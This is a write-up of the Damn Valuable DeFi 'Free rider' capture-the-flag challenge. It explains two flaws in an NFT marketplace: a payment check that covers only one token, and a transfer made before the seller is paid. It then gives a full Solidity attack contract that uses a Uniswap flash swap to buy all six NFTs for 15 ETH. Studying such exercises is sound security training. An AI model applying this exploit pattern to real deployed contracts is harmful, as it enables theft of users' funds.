# Challenge #10 - Free rider

A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.

You want to build some rep with this buyer, so you've agreed with the plan.

Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.

# Solution

There is 2 exploits with the NFT market place:

first one is related to this line: `require(msg.value >= priceToPay, "Amount paid is not enough");`. Contract checks if buyer has enough for one nft instead of the totality

second is related to the fact that this line : `token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);` is before `payable(token.ownerOf(tokenId)).sendValue(priceToPay);` meaning the buyer will as well receive the money from the nftmarket place.

```
contract Attack is IERC721Receiver {
    address payable private nftMarketPlace;
    address payable private riderBuyer;
    uint256[] private tokensIds = [0, 1, 2, 3, 4, 5];
    address payable private damnValuableNFT;
    WETH private weth;
    address payable uniswapPair;
    uint256 private received;
    DamnValuableNFT public token;

    constructor(
        address _nftMarketPlace,
        address _riderBuyer,
        address _damnValuableNFT,
        address _weth,
        address payable _uniswapPair
    ) {
        riderBuyer = payable(_riderBuyer);
        nftMarketPlace = payable(_nftMarketPlace);
        damnValuableNFT = payable(_damnValuableNFT);
        weth = WETH(_weth);
        uniswapPair = payable(_uniswapPair);
        token = new DamnValuableNFT();
    }
    //this function will be called by the NFT marketplace to transfer to NFT to this contract
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
    function transferToMarket() public {
        console.log(weth.balanceOf(uniswapPair));
        //get a flash loan fromm uniswapv2pair
        UniswapV2Pair(uniswapPair).swap(
            15 ether,
            0,
            address(this),
            abi.encode("callme()")
        );
    }
    //this function will be call as the contract doesnt have a "callme" function
    fallback() external payable {
        //get eth from weth in order to buy the nft
        weth.withdraw(15 ether);
        uint256 amount = 15 ether;
        //buy the nfts (only sending the price for 1 is ok as there is an exploit with the contract)
        FreeRiderNFTMarketplace(nftMarketPlace).buyMany{value: 15 ether}(
            tokensIds
        );
        //transfer the nfts to the buyer in order to have attacker receive the money
        for (uint256 i = 0; i < tokensIds.length; i++) {
            DamnValuableNFT(damnValuableNFT).safeTransferFrom(
                address(this),
                riderBuyer,
                i
            );
        }
        //calculate fee (approximately 3 per cent)
        uint256 fee = 1 + (amount * 3) / 997;
        weth.deposit{value: fee + amount}();
        //send back flash loan money + the fee
        weth.transfer(uniswapPair, fee + amount);
    }
    receive() external payable {}
}
```
